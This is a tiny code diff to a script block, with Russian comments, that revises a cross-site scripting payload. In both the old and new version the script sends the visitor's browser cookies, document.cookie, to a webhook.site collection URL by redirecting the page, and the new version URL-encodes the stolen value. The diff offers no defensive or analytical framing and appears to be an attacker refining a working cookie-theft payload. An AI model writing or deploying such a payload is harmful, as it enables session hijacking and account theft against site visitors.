@@ -1,4 +1,4 @@
 <script>
-    // Просто пересылаем куки в URL
-    window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?cookies=" + document.cookie;
+    // Вариант 1 - через переход по ссылке
+    window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?cookies=" + encodeURIComponent(document.cookie);
 </script>
